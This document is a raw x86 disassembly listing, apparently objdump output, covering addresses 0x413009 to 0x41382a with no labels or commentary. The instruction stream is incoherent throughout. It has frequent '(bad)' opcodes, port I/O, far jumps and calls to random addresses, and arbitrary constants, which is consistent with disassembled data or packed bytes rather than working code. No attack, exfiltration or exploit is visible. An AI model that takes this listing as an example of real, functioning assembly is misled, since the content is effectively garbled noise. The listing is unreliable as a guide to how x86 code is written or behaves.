  413009:	idiv   BYTE PTR [eax+0x35]
  41300c:	pusha  
  41300d:	(bad)  
  41300e:	daa    
  41300f:	jmp    0x2e7638a
  413014:	out    dx,eax
  413015:	mov    edi,edx
  413017:	pop    ds
  413018:	xchg   edx,eax
  413019:	in     al,0xde
  41301b:	sbb    dl,dl
  41301d:	sub    eax,0xf9e6cddb
  413022:	cmp    eax,0xc0632cb8
  413027:	rcl    DWORD PTR [edi-0x4b],cl
  41302a:	(bad)
  41302e:	xchg   eax,ebp
  413030:	dec    edx
  413031:	pop    esp
  413032:	mov    eax,0x6ac362e7
  413037:	add    al,0xcf
  413039:	out    dx,al
  41303a:	lods   al,BYTE PTR ds:[esi]
  41303b:	jp     0x413060
  41303d:	mov    al,ds:0xf96a87a5
  413042:	or     DWORD PTR [edx],ebx
  413044:	or     eax,DWORD PTR [ebx-0x4bab3b7]
  41304a:	sar    BYTE PTR [eax-0x442fe15],1
  413050:	fdivr  DWORD PTR [esi+eax*2]
  413053:	cdq    
  413054:	sbb    BYTE PTR [eax+ebx*1+0x5eb8b7f3],bl
  41305b:	pushf  
  41305c:	inc    esp
  41305d:	add    esi,0x6c
  413060:	enter  0xeb96,0x5b
  413064:	lea    eax,[ecx+ebp*1+0x27]
  413068:	std    
  413069:	sub    edi,ebp
  41306b:	loopne 0x41308e
  41306d:	add    ebp,DWORD PTR [esi]
  41306f:	xor    cl,BYTE PTR [eax-0x58225ecc]
  413075:	lea    ebp,[edi-0x60dea9cd]
  41307b:	leave  
  41307c:	aad    0x88
  41307e:	call   0x920006f2
  413083:	mov    ds:0x62be865b,eax
  413088:	and    ebp,edi
  41308a:	pop    ss
  41308b:	icebp  
  41308c:	(bad)  
  41308d:	mov    ebx,0xcc8e0665
  413092:	jno    0x413018
  413094:	(bad)  
  413096:	adc    BYTE PTR [ecx-0x49bc98c],dh
  41309c:	or     bh,dl
  41309e:	int3   
  41309f:	sahf   
  4130a0:	(bad)  
  4130a2:	dec    edi
  4130a3:	or     BYTE PTR gs:[ecx+edx*1],0x89
  4130a8:	or     al,bh
  4130aa:	add    DWORD PTR [ebp+0x3a],edx
  4130ad:	jecxz  0x4130a2
  4130af:	mov    edi,0xb0cacd80
  4130b4:	je     0x4130dc
  4130b6:	mov    bh,0x7f
  4130b8:	adc    DWORD PTR [eax-0x67],edi
  4130bb:	mov    DWORD PTR [ecx+0x78106d19],esi
  4130c1:	pop    ds
  4130c2:	sti    
  4130c3:	clc    
  4130c4:	xchg   edi,eax
  4130c5:	popf   
  4130c6:	mov    edi,0xffd9cc7
  4130cb:	and    edx,eax
  4130cd:	fs jge 0x4130bc
  4130d0:	inc    edx
  4130d1:	jns    0x41309c
  4130d3:	sub    eax,0x5ee2adf1
  4130d8:	adc    ah,BYTE PTR es:[esi+0x5e]
  4130dc:	adc    esp,0xa0fcdc01
  4130e2:	loopne 0x413156
  4130e4:	lea    esi,[bx+di+0x15]
  4130e8:	jge    0x413126
  4130ea:	cli    
  4130eb:	jg     0x4130c2
  4130ed:	mov    cl,BYTE PTR [ecx+0x1ee5fd57]
  4130f3:	repnz hlt 
  4130f5:	and    DWORD PTR [edi+0x63569ec3],edi
  4130fb:	pusha  
  4130fc:	nop
  4130fd:	les    ecx,FWORD PTR [ebp+0x7be21060]
  413103:	ds pop edi
  413105:	(bad)  
  413108:	xchg   ebp,eax
  413109:	and    DWORD PTR [ebx+0x40cfa797],0x1f
  413110:	shr    DWORD PTR [edi-0x3531caea],0x6a
  413117:	adc    eax,0x41492370
  41311c:	stc    
  41311d:	sub    ecx,DWORD PTR [ebp-0x14f57367]
  413123:	push   es
  413124:	sub    BYTE PTR [esi+0x798d9a91],0xc
  41312b:	test   BYTE PTR [edx],cl
  41312d:	push   0xffffff81
  41312f:	add    dh,BYTE PTR [eax+0x1da87b91]
  413135:	pop    ebx
  413136:	ds leave 
  413138:	jecxz  0x413136
  41313a:	add    ecx,DWORD PTR [edx]
  41313c:	iret   
  41313d:	addr16 dec ecx
  41313f:	imul   ebp,DWORD PTR ds:0x4df9bf30,0x30
  413146:	mov    bh,0xa5
  413148:	mov    ch,0x85
  41314a:	in     al,0xb7
  41314c:	lea    ebp,[ebp+0x3dd7504c]
  413152:	pop    ecx
  413153:	das    
  413154:	jmp    0x413102
  413156:	lfs    ebx,FWORD PTR [eax-0x2c]
  41315a:	lods   eax,DWORD PTR ds:[esi]
  41315b:	mov    bh,0x4b
  41315d:	retf   
  41315e:	mov    esi,0x3de172a5
  413163:	ret    
  413164:	shl    ah,0x4a
  413167:	test   eax,0xd4134491
  41316c:	(bad)  
  41316d:	xor    bh,BYTE PTR [edi-0x1f]
  413170:	mov    fs,WORD PTR [edi-0x59]
  413173:	sbb    DWORD PTR [eax],ebx
  413175:	out    dx,eax
  413176:	sub    al,0x6
  413178:	repz push esi
  41317a:	and    al,0xd1
  41317c:	jmp    0x2cd1:0x27512e38
  413183:	fcomp  DWORD PTR [edi-0xf]
  413186:	fist   WORD PTR [edi-0xd6d5a86]
  41318c:	lea    eax,[ebp-0x65]
  41318f:	dec    esi
  413190:	(bad)  
  413191:	rol    BYTE PTR [ebp+0x34],1
  413194:	push   eax
  413195:	stos   BYTE PTR es:[edi],al
  413196:	in     eax,0x79
  413198:	call   0xb9c957f9
  41319d:	scas   eax,DWORD PTR es:[edi]
  41319e:	xor    DWORD PTR [eax-0x6364d1a1],eax
  4131a4:	nop
  4131a5:	test   al,0x68
  4131a7:	mov    gs,WORD PTR [esi-0x10641e65]
  4131ad:	clc    
  4131ae:	in     eax,0xf4
  4131b0:	sub    DWORD PTR [edx],ebx
  4131b2:	push   ecx
  4131b3:	sub    esp,DWORD PTR [ebx-0x54]
  4131b6:	test   bl,0xa1
  4131b9:	setno  bl
  4131bc:	xor    eax,0xcb0878e0
  4131c1:	fwait
  4131c2:	mov    ecx,0x262b9550
  4131c7:	leave  
  4131c8:	ret    0x2e52
  4131cb:	push   ebp
  4131cc:	or     al,0x61
  4131ce:	or     ah,BYTE PTR [edx+ebp*2-0x66]
  4131d2:	iret   
  4131d3:	push   ebp
  4131d4:	nop
  4131d5:	loop   0x4131f8
  4131d7:	push   ss
  4131d8:	push   cs
  4131d9:	pushf  
  4131da:	jo     0x413235
  4131dc:	mov    ebx,0x6fa45ba2
  4131e1:	enter  0xe05,0xe2
  4131e5:	mov    bh,0x4a
  4131e7:	pop    edx
  4131e8:	call   0xddf2:0xc333a139
  4131ef:	fistp  WORD PTR [ecx-0xf78c57]
  4131f5:	out    dx,al
  4131f6:	fnsave [eax]
  4131f8:	add    al,0x8f
  4131fa:	fucomp st(5)
  4131fc:	fmul   DWORD PTR [esi]
  4131fe:	in     eax,dx
  4131ff:	das    
  413200:	bound  esp,QWORD PTR [edi]
  413202:	cmp    eax,0x7e181e4e
  413207:	fwait
  413208:	in     al,0xaa
  41320a:	dec    edx
  41320b:	outs   dx,BYTE PTR ds:[esi]
  41320c:	cli    
  41320d:	pop    DWORD PTR [ecx-0x27]
  413210:	xchg   esp,eax
  413211:	xchg   esi,eax
  413212:	mov    BYTE PTR [edx+0x4c],bh
  413215:	hlt    
  413216:	xor    eax,0x73a2c0b3
  41321b:	add    al,0x5a
  41321d:	push   esi
  41321e:	mov    bl,0xb1
  413220:	pusha  
  413221:	inc    ebx
  413222:	int    0x29
  413224:	sub    al,0x2c
  413226:	hlt    
  413227:	sub    ebp,DWORD PTR cs:[ebx-0x40016359]
  41322e:	loopne 0x41325d
  413230:	pop    esi
  413231:	push   edi
  413232:	shl    dh,0x5d
  413235:	fdivr  st,st(4)
  413237:	retf   
  413238:	xchg   edi,eax
  413239:	or     BYTE PTR [edx+eiz*4+0x49fb693a],cl
  413240:	pop    ecx
  413241:	jle    0x4131c4
  413243:	sbb    eax,ebp
  413245:	jle    0x41320e
  413247:	rol    BYTE PTR [ebx],0xf7
  41324a:	loope  0x413226
  41324c:	std    
  41324d:	push   es
  41324e:	jmp    0x75a5d58b
  413253:	lods   eax,DWORD PTR ds:[esi]
  413254:	xor    dh,BYTE PTR [esi]
  413256:	stos   BYTE PTR es:[edi],al
  413257:	or     ebx,0xffffff83
  41325a:	pop    edi
  41325b:	cmp    BYTE PTR [ecx-0x4b],bl
  41325e:	sbb    BYTE PTR [edi],al
  413260:	xchg   esp,eax
  413261:	mov    eax,0x51b26f8f
  413266:	mov    ebp,0x363ffdd4
  41326b:	sbb    dl,BYTE PTR ds:0x49d6efb8
  413271:	mov    dl,0x56
  413273:	or     edi,DWORD PTR [ecx]
  413275:	call   0x83ce647c
  41327a:	sti    
  41327b:	in     al,0x53
  41327d:	inc    edx
  41327e:	imul   ebp,DWORD PTR [edi-0x53e19014],0x3b927cf1
  413288:	mov    al,ds:0x7e675e0d
  41328d:	jl     0x4132d0
  41328f:	out    0x16,eax
  413291:	jmp    0x10ecb86e
  413296:	push   esp
  413297:	enter  0xd7fb,0xd8
  41329b:	push   es
  41329c:	lahf   
  41329d:	dec    edi
  41329e:	mov    bh,0x3b
  4132a0:	or     al,0xba
  4132a2:	icebp  
  4132a3:	mov    bx,0xe63f
  4132a7:	dec    ebx
  4132a8:	sub    BYTE PTR [edx-0x433b0f0b],0xc4
  4132af:	dec    edx
  4132b0:	push   ds
  4132b1:	cmp    BYTE PTR [esi+0x7f],dl
  4132b4:	mov    ecx,0x282dc00d
  4132b9:	fcomp  DWORD PTR [esp]
  4132bc:	lea    edi,[edi+eiz*1+0x10]
  4132c0:	sar    edi,1
  4132c2:	adc    ebx,eax
  4132c4:	cwde   
  4132c5:	call   0xe1b085d
  4132ca:	and    ecx,DWORD PTR [ebp-0x51]
  4132cd:	and    eax,0x839f589f
  4132d2:	cmp    DWORD PTR [ecx+0x6bfd3eb8],ecx
  4132d8:	xchg   ebx,eax
  4132d9:	mov    edx,0xacfe90f5
  4132de:	xor    al,0xaf
  4132e0:	mov    ebp,0x57d48d6e
  4132e5:	jmp    0x9a67a88b
  4132ea:	ret    
  4132eb:	stos   DWORD PTR es:[edi],eax
  4132ec:	jno    0x41334a
  4132ee:	cmp    ch,BYTE PTR [esi+0x1d796599]
  4132f4:	pop    eax
  4132f5:	add    ah,bh
  4132f7:	push   esi
  4132f8:	loopne 0x4132f6
  4132fa:	popa   
  4132fb:	ins    DWORD PTR es:[edi],dx
  4132fc:	mov    al,0xf9
  4132fe:	jg     0x41331b
  413300:	and    DWORD PTR [edi+0x400829a3],esp
  413306:	mov    BYTE PTR [esi],bl
  413308:	inc    esp
  413309:	inc    esi
  41330a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41330b:	mov    WORD PTR [esi+ebp*2-0x6015ca90],ss
  413312:	stc    
  413313:	aam    0x6c
  413315:	repz mov ds:0x617e4d0c,eax
  41331b:	xchg   bl,ch
  41331d:	aas    
  41331e:	test   eax,0xd349ff45
  413323:	or     cl,cl
  413325:	adc    al,0x95
  413327:	jne    0x4132c1
  413329:	hlt    
  41332a:	fcmovu st,st(5)
  41332c:	jl     0x41337b
  41332e:	enter  0x4cb6,0x4a
  413332:	mov    edi,DWORD PTR [edi]
  413334:	jbe    0x4133a4
  413336:	(bad)  
  413338:	adc    ch,BYTE PTR [eax-0x3f]
  41333b:	fimul  DWORD PTR [esi-0x30e243ac]
  413341:	loope  0x41334d
  413343:	pop    ecx
  413344:	repnz fnstsw WORD PTR [esp+ebp*2-0x4e989d52]
  41334c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41334d:	pop    esi
  41334e:	adc    ecx,edi
  413350:	pop    ecx
  413351:	ret    
  413352:	push   ds
  413353:	push   ebx
  413354:	jno    0x413353
  413356:	and    eax,0x90781de
  41335b:	cli    
  41335c:	shl    BYTE PTR [ebp-0x555081f],cl
  413362:	jbe    0x41334e
  413364:	or     eax,0x7e7789ef
  413369:	test   DWORD PTR [ebp-0x1],eax
  41336c:	mov    dh,0x9d
  41336e:	xor    eax,0x6196a736
  413373:	fistp  WORD PTR [edi+ecx*2]
  413376:	inc    edi
  413377:	stc    
  413378:	jnp    0x4133de
  41337a:	cmc    
  41337b:	sbb    al,BYTE PTR [ecx+eiz*4-0xe]
  41337f:	mov    ds:0xfa322c67,al
  413384:	repz or eax,esi
  413387:	mov    fs,WORD PTR [ecx-0x51]
  41338a:	pop    ecx
  41338b:	enter  0x9c20,0xbe
  41338f:	(bad)  
  413390:	ss ins DWORD PTR es:[edi],dx
  413392:	sbb    eax,0x61795b9e
  413397:	xor    al,0x73
  413399:	(bad)  
  41339a:	sub    BYTE PTR [ebx+0x6f],dl
  41339d:	in     eax,dx
  41339e:	push   eax
  41339f:	mov    ecx,0x1f25f48
  4133a4:	sbb    esp,DWORD PTR [ebp+0x7a]
  4133a7:	call   0x345ff415
  4133ac:	mov    ah,0x5a
  4133ae:	xchg   ecx,eax
  4133af:	and    dl,BYTE PTR ds:0xad037a32
  4133b5:	loope  0x4133a2
  4133b7:	jmp    0x784b0d62
  4133bc:	mov    al,ds:0xa143e2b5
  4133c1:	push   0xfffffff8
  4133c3:	inc    ebx
  4133c4:	xabort 0x42
  4133c7:	outs   dx,BYTE PTR ds:[esi]
  4133c8:	cmp    esp,DWORD PTR [esi-0x64653d72]
  4133ce:	jo     0x4133bc
  4133d0:	and    DWORD PTR [eax],ebx
  4133d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133d3:	(bad)  
  4133d4:	xchg   edx,eax
  4133d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133d6:	out    dx,eax
  4133d7:	pop    ebp
  4133d8:	(bad)  
  4133d9:	cld    
  4133da:	mov    ds:0x25870c8b,al
  4133df:	cmp    eax,0x33ad3b
  4133e4:	sti    
  4133e5:	jmp    0xdc91:0xa672d520
  4133ec:	push   cs
  4133ed:	out    0x18,al
  4133ef:	inc    ebp
  4133f0:	pusha  
  4133f1:	fsub   QWORD PTR [eax-0x9]
  4133f4:	mov    ebx,0xb62fe4c6
  4133f9:	inc    esi
  4133fa:	inc    ebp
  4133fb:	ss pop edi
  4133fd:	cmp    dh,BYTE PTR [edx]
  4133ff:	nop
  413400:	and    DWORD PTR [ecx],edx
  413402:	clc    
  413403:	bound  esp,QWORD PTR [ebp+0x52]
  413406:	test   al,0xd1
  413408:	cmc    
  413409:	dec    esp
  41340a:	add    DWORD PTR [edx],ecx
  41340c:	sti    
  41340d:	xchg   edi,eax
  41340e:	jl     0x413478
  413410:	dec    esi
  413411:	fsubp  st(6),st
  413413:	in     eax,0x3a
  413415:	ror    DWORD PTR [ebx-0x67],0xb6
  413419:	sti    
  41341a:	shl    ch,cl
  41341c:	in     eax,0x8a
  41341e:	xor    BYTE PTR [edi+ecx*2],0x38
  413422:	add    al,0x40
  413424:	mov    eax,ds:0x612038c6
  413429:	dec    eax
  41342a:	test   eax,0xba8577f4
  41342f:	(bad)  
  413430:	ficomp DWORD PTR [ecx-0x5eec2409]
  413436:	pushf  
  413437:	data16 arpl WORD PTR [edi-0x66],ax
  41343b:	dec    edx
  41343c:	ss mov ch,0xbd
  41343f:	adc    ah,cl
  413441:	xchg   ebx,eax
  413442:	das    
  413443:	and    DWORD PTR [ebp-0x4477771e],esi
  413449:	(bad)  
  41344a:	inc    eax
  41344b:	fldcw  WORD PTR [ebp+ebp*4+0x14]
  41344f:	dec    BYTE PTR [edx+0xe]
  413452:	push   es
  413453:	mov    edi,0xd7a3ee27
  413458:	aaa    
  413459:	inc    DWORD PTR [ebp+0x4e]
  41345c:	mov    dh,cl
  41345e:	scas   eax,DWORD PTR es:[edi]
  41345f:	das    
  413460:	fld    TBYTE PTR [ebx+0x9d87c48]
  413466:	push   edi
  413467:	out    0xda,eax
  413469:	jecxz  0x413408
  41346b:	xor    BYTE PTR [esi+0x26],0x5c
  41346f:	js     0x41344c
  413471:	cmp    esi,DWORD PTR [ebx+0x23]
  413474:	outs   dx,DWORD PTR ds:[esi]
  413475:	push   0x31
  413477:	and    esp,DWORD PTR [ebx]
  413479:	adc    edx,DWORD PTR [esi-0x55]
  41347c:	iret   
  41347d:	mov    esp,0x525151c6
  413482:	in     eax,dx
  413483:	sbb    BYTE PTR ds:0x9c763b58,cl
  413489:	fld    TBYTE PTR [edi-0x58451028]
  41348f:	cdq    
  413490:	pop    dx
  413492:	mov    bl,0xcd
  413494:	pop    edx
  413495:	out    0xcc,eax
  413497:	adc    eax,0x422a7098
  41349c:	enter  0x4c9d,0x2d
  4134a0:	cdq    
  4134a1:	in     eax,0x70
  4134a3:	push   ecx
  4134a4:	xchg   esi,eax
  4134a5:	gs loop 0x413467
  4134a8:	sbb    esi,DWORD PTR [ecx]
  4134aa:	and    ebp,DWORD PTR [esi+edi*1+0x6f28acc9]
  4134b1:	adc    eax,0x5d5f5383
  4134b6:	rcl    ebp,0x1
  4134b9:	(bad)  
  4134ba:	es (bad) 
  4134bd:	add    al,0x8d
  4134bf:	in     eax,0x41
  4134c1:	in     al,dx
  4134c2:	mov    edx,0x99b6abf5
  4134c7:	imul   esp,DWORD PTR [eax-0x11],0xf1e4461f
  4134ce:	pop    eax
  4134cf:	jl     0x413473
  4134d1:	pop    eax
  4134d2:	push   0xffffffe6
  4134d4:	fscale 
  4134d6:	or     eax,0xfc57936e
  4134db:	xchg   ebx,eax
  4134dc:	mov    eax,0xf9dda382
  4134e1:	xor    ebx,edi
  4134e3:	mov    BYTE PTR ds:0x73b8bab1,ah
  4134e9:	ret    
  4134ea:	gs push edi
  4134ec:	add    BYTE PTR [bp+di+0x25],dh
  4134f0:	outs   dx,DWORD PTR ds:[esi]
  4134f1:	xlat   BYTE PTR ds:[ebx]
  4134f2:	mov    BYTE PTR es:[eax+0x6a],dl
  4134f6:	pop    ebp
  4134f7:	mov    ebx,0x2445bd8b
  4134fc:	not    BYTE PTR [eax+0x30]
  4134ff:	gs xchg esi,eax
  413501:	or     DWORD PTR [eax+0x1311f513],0x126610dc
  41350b:	dec    esp
  41350c:	ror    BYTE PTR ds:0x15441dec,0xf3
  413513:	repnz or ch,ah
  413516:	shr    BYTE PTR [edi],cl
  413518:	cwde   
  413519:	adc    BYTE PTR [eax+ecx*4+0x4f],cl
  41351d:	xlat   BYTE PTR ds:[ebx]
  41351e:	add    BYTE PTR [edx+0x28],cl
  413521:	pop    edi
  413522:	lods   al,BYTE PTR ds:[esi]
  413523:	and    ch,BYTE PTR [esi+0x18]
  413526:	scas   eax,DWORD PTR es:[edi]
  413527:	in     eax,0x52
  413529:	sub    esi,esi
  41352b:	pop    ds
  41352c:	dec    esp
  41352d:	and    BYTE PTR ss:[ebx+0x77f24224],al
  413534:	mov    sp,0x6bb
  413538:	dec    esp
  413539:	mov    edx,0x90c4393
  41353e:	ins    BYTE PTR es:[edi],dx
  41353f:	inc    edx
  413540:	cmp    eax,0x539b21f0
  413545:	sub    BYTE PTR [ebp-0x12],dl
  413548:	out    dx,al
  413549:	fs in  eax,0x52
  41354c:	cli    
  41354d:	mov    DWORD PTR [edx-0x1c],ebx
  413550:	adc    ebp,ebx
  413552:	clc    
  413553:	pop    ds
  413554:	les    esp,FWORD PTR [ebx+esi*2]
  413557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413558:	repnz out 0x65,al
  41355b:	in     eax,0x22
  41355d:	jb     0x413523
  41355f:	jnp    0x413502
  413561:	jmp    0xb710:0xf4691263
  413568:	pop    esi
  413569:	sti    
  41356a:	mov    bh,0x9
  41356c:	sbb    BYTE PTR [ebx-0x2864df71],cl
  413572:	and    al,0x1f
  413574:	cmp    BYTE PTR [edx+0x68],cl
  413577:	push   edi
  413578:	cwde   
  413579:	into   
  41357a:	call   DWORD PTR [ecx+0x51c11d08]
  413580:	xor    eax,0x8d4dd78c
  413585:	(bad)  
  413586:	xor    ah,BYTE PTR [edx-0x4]
  413589:	mov    esp,0x5a49afd7
  41358e:	fwait
  41358f:	jecxz  0x41358a
  413591:	mov    ds:0x45c5b8da,eax
  413596:	push   edi
  413597:	mov    dh,0xf8
  413599:	jp     0x413569
  41359b:	in     al,dx
  41359c:	jae    0x41355c
  41359e:	fild   WORD PTR [ebx]
  4135a0:	mov    bl,0x83
  4135a2:	imul   eax,DWORD PTR [edi+0xe155cc9],0xffffffed
  4135a9:	xchg   ebp,eax
  4135aa:	loopne 0x41358e
  4135ac:	dec    ebp
  4135ad:	out    dx,eax
  4135ae:	adc    ah,0xb3
  4135b1:	jp     0x41355a
  4135b3:	push   edi
  4135b4:	jmp    0x3848:0x2ba6359f
  4135bb:	jb     0x413618
  4135bd:	in     al,dx
  4135be:	xlat   BYTE PTR ds:[ebx]
  4135bf:	popa   
  4135c0:	pop    edx
  4135c1:	add    DWORD PTR ds:0x2e611d89,edx
  4135c7:	xchg   esp,eax
  4135c8:	loope  0x413551
  4135ca:	sub    esp,ecx
  4135cc:	cmp    eax,0x1f8bd3ec
  4135d1:	pop    eax
  4135d2:	js     0x413574
  4135d4:	ins    BYTE PTR es:[edi],dx
  4135d5:	sub    DWORD PTR [esi-0x7183c5e4],edi
  4135db:	outs   dx,DWORD PTR ds:[esi]
  4135dc:	and    bh,BYTE PTR [edi]
  4135de:	mov    eax,es
  4135e0:	jne    0x4135f0
  4135e2:	mov    ch,0x11
  4135e4:	adc    BYTE PTR [esi],0xbd
  4135e7:	mov    edi,DWORD PTR [edx]
  4135e9:	ffree  st(3)
  4135eb:	aad    0x6d
  4135ed:	push   eax
  4135ee:	jecxz  0x41357c
  4135f0:	xchg   esi,eax
  4135f1:	mov    edx,0x172812dd
  4135f6:	(bad)  
  4135f7:	push   es
  4135f8:	add    ecx,DWORD PTR [edx+0x1b]
  4135fb:	or     edi,ecx
  4135fd:	mov    DWORD PTR [edx-0xaab69b6],edi
  413603:	stc    
  413604:	into   
  413605:	push   edx
  413606:	sub    bh,BYTE PTR [edi]
  413608:	adc    DWORD PTR [ebx],ebp
  41360a:	dec    esp
  41360b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41360c:	pushf  
  41360d:	and    eax,0x5a00c9d0
  413612:	repz push 0xffffffae
  413615:	ss sub eax,ecx
  413618:	in     eax,0x64
  41361a:	sbb    DWORD PTR ds:[eax-0x4bd15b19],esi
  413621:	sub    al,0x9e
  413623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413624:	scas   al,BYTE PTR es:[edi]
  413625:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413626:	adc    edi,eax
  413628:	mov    edi,0xe4d9fbd4
  41362d:	and    eax,0x21fbf6aa
  413632:	test   al,0xc0
  413634:	arpl   WORD PTR [ebx+0x282a061d],di
  41363a:	and    eax,0xc08eb573
  41363f:	int    0x6b
  413641:	jg     0x4135d1
  413643:	repz sbb eax,0x3556468d
  413649:	jb     0x4136b5
  41364b:	or     dh,BYTE PTR [eax-0x74]
  41364e:	fild   QWORD PTR [ebp+esi*4-0x6b738558]
  413655:	mov    bh,0xd1
  413657:	jl     0x4136a9
  413659:	mov    DWORD PTR [esi-0x1],eax
  41365c:	cld    
  41365d:	jl     0x41360e
  41365f:	xchg   ebx,ebx
  413661:	inc    ebp
  413662:	adc    al,0xf5
  413664:	mov    ds:0x8e62cc52,eax
  413669:	adc    DWORD PTR [eax+0x34],eax
  41366c:	sar    DWORD PTR [ecx],0xa5
  41366f:	and    BYTE PTR [ecx+0x3],bh
  413672:	mov    al,ds:0xd9b32be4
  413677:	mov    dl,0x1
  413679:	call   0x9751:0xfa0d7c9c
  413680:	xor    ch,BYTE PTR [edx-0x8]
  413683:	repz sub DWORD PTR [eax+0x31],ecx
  413687:	popf   
  413688:	xchg   edi,eax
  413689:	mov    bl,0x82
  41368b:	inc    edx
  41368c:	sub    ah,BYTE PTR [edx+0x2c42e71]
  413692:	mov    ecx,0x3136b7d4
  413697:	fwait
  413698:	jecxz  0x413662
  41369a:	mov    ch,0xff
  41369c:	push   esi
  41369d:	scas   eax,DWORD PTR es:[edi]
  41369e:	pop    edi
  41369f:	pop    ebx
  4136a0:	psllw  mm6,QWORD PTR [ebp-0x38]
  4136a4:	retf   
  4136a5:	aam    0x6d
  4136a7:	lock aam 0x5e
  4136aa:	inc    ebp
  4136ab:	xchg   ebx,eax
  4136ac:	or     esp,DWORD PTR [ecx+0x8]
  4136af:	jno    0x4136c7
  4136b1:	jno    0x413676
  4136b3:	fld    TBYTE PTR [eax+0x77ac187]
  4136b9:	call   FWORD PTR [ecx]
  4136bb:	stos   BYTE PTR es:[edi],al
  4136bc:	lods   eax,DWORD PTR ds:[esi]
  4136bd:	je     0x41371f
  4136bf:	dec    ebp
  4136c0:	mov    ah,BYTE PTR [esi+0x40]
  4136c3:	imul   ecx,DWORD PTR ds:0x9889ea1f,0x6a
  4136ca:	cwde   
  4136cb:	je     0x4136dc
  4136cd:	inc    eax
  4136ce:	push   ds
  4136cf:	mov    eax,ds:0x1f40348c
  4136d4:	sub    eax,0x3e33aa92
  4136d9:	mov    ds:0xeef3f7e5,eax
  4136de:	sbb    eax,0x283fefc
  4136e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136e5:	in     al,dx
  4136e6:	pop    ebx
  4136e7:	push   ss
  4136e8:	imul   edx,esi,0xffffffd7
  4136eb:	dec    ebp
  4136ec:	inc    edi
  4136ed:	repnz (bad) 
  4136ef:	and    BYTE PTR [eax+0x2c305b86],ah
  4136f5:	sub    al,BYTE PTR [ebp+0xd45ef1a]
  4136fb:	sub    BYTE PTR [ebp+0x74],dh
  4136fe:	add    al,0x53
  413700:	lods   al,BYTE PTR ds:[esi]
  413701:	ins    BYTE PTR es:[edi],dx
  413702:	cmp    ebp,DWORD PTR [esi-0xbd68e23]
  413708:	sbb    DWORD PTR ds:0xac70975b,esi
  41370e:	mov    ebp,0x1a77d516
  413713:	mov    cs,WORD PTR [edi+0x7b]
  413716:	or     bh,BYTE PTR [esi]
  413718:	(bad)  
  41371a:	es xchg esi,eax
  41371c:	mov    eax,DWORD PTR [esi]
  41371e:	pop    eax
  41371f:	jmp    0xf1f5183f
  413724:	popf   
  413725:	push   cs
  413726:	pop    ds
  413727:	ds je  0x41371d
  41372a:	or     eax,ebx
  41372c:	and    BYTE PTR [ebp-0x781c7c5e],dl
  413732:	jns    0xef227b5
  413738:	(bad)  
  413739:	into   
  41373a:	mov    edx,0xfef289f6
  41373f:	jl     0x4137a1
  413741:	ins    DWORD PTR es:[edi],dx
  413742:	sbb    dh,BYTE PTR [edx-0x42cff898]
  413748:	aaa    
  413749:	sub    al,0x59
  41374b:	jg     0x4136ec
  41374d:	xor    edx,DWORD PTR [edi+0x747af3bc]
  413753:	mul    ebp
  413755:	mov    DWORD PTR [edi-0x1465146c],esp
  41375b:	out    0xdf,al
  41375d:	daa    
  41375e:	les    esi,FWORD PTR [ebx]
  413760:	stc    
  413761:	shl    BYTE PTR [eax],1
  413763:	outs   dx,DWORD PTR ds:[esi]
  413764:	mov    fs,WORD PTR [esi+0x3a75e326]
  41376a:	push   esi
  41376b:	cmp    edi,DWORD PTR [edi-0x2b200266]
  413771:	add    eax,0xe5263899
  413776:	cdq    
  413777:	aam    0xce
  413779:	or     eax,0x4035b46b
  41377e:	and    BYTE PTR [ebx+0x30f453b9],ah
  413784:	data16 xor BYTE PTR [eax+0x6d],ch
  413788:	xor    DWORD PTR [esi+edi*2],0x24
  41378c:	sub    cl,dh
  41378e:	je     0x413744
  413790:	ja     0x4137e9
  413792:	fs inc ebp
  413794:	xchg   edi,eax
  413795:	mov    edx,0xd4013cf4
  41379a:	int    0x87
  41379c:	in     eax,0xc7
  41379e:	cmp    bh,dh
  4137a0:	js     0x4137b6
  4137a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137a3:	mov    dl,0xf0
  4137a5:	add    dl,dl
  4137a7:	js     0x41376f
  4137a9:	push   edx
  4137aa:	sub    eax,0xb04b8404
  4137af:	pop    esi
  4137b0:	stc    
  4137b1:	mov    bl,0xcb
  4137b3:	in     al,0x51
  4137b5:	cmc    
  4137b6:	sbb    BYTE PTR [ecx],cl
  4137b8:	push   esp
  4137b9:	add    BYTE PTR [esi+ebp*2-0x35],0x80
  4137be:	push   edx
  4137bf:	inc    eax
  4137c0:	pop    edi
  4137c1:	sub    BYTE PTR [edx-0xe2d1684],dh
  4137c7:	shl    DWORD PTR [eax-0x13c846b3],1
  4137cd:	fwait
  4137ce:	pop    es
  4137cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137d0:	lds    ebx,FWORD PTR ds:0x931d85df
  4137d6:	sti    
  4137d7:	sub    ebp,DWORD PTR [eax]
  4137d9:	sub    al,0x7c
  4137db:	cmp    bh,BYTE PTR [ebx+eax*4-0x70]
  4137df:	cmp    al,0x37
  4137e1:	imul   ecx,DWORD PTR [ecx+0x44],0xcd316d85
  4137e8:	mov    ds:0x61ed8aaa,eax
  4137ed:	push   es
  4137ee:	push   ds
  4137ef:	icebp  
  4137f0:	mov    cl,0xf2
  4137f2:	and    ebp,DWORD PTR [edi+0x1e]
  4137f5:	jae    0x4137d2
  4137f7:	xor    eax,0xb2ff565c
  4137fc:	push   cs
  4137fd:	sbb    BYTE PTR [ebp-0x4],0x69
  413801:	sub    ebp,DWORD PTR [edx+eiz*2+0x7b8f5739]
  413808:	jmp    0xcfd53ad0
  41380d:	cwde   
  41380e:	jp     0x4137ab
  413810:	(bad)  
  413811:	not    DWORD PTR [eax+0x23a0e3ef]
  413817:	nop
  413818:	jl     0x41381e
  41381a:	mov    ds:0xc8d052bd,al
  41381f:	clc    
  413820:	inc    ebp
  413821:	and    bh,0xa9
  413824:	inc    ebx
  413825:	xchg   si,ax
  413827:	sub    BYTE PTR [edi+esi*8],al
  41382a:	popa   
